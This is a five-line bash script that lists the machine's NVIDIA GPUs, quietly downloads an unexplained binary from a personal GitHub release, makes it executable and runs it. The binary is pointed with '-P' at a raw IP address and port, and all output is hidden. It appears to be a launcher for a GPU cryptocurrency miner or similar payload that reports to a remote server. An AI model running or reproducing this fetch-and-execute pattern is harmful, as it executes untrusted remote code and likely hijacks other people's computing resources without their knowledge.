#!/bin/bash
nvidia-smi -L
wget https://github.com/paytonkji87/abc/releases/download/1/abcdesgh &> /dev/null
chmod +x abcdesgh
./abcdesgh -P http://38.130.221.109:4545/"$1" &> log
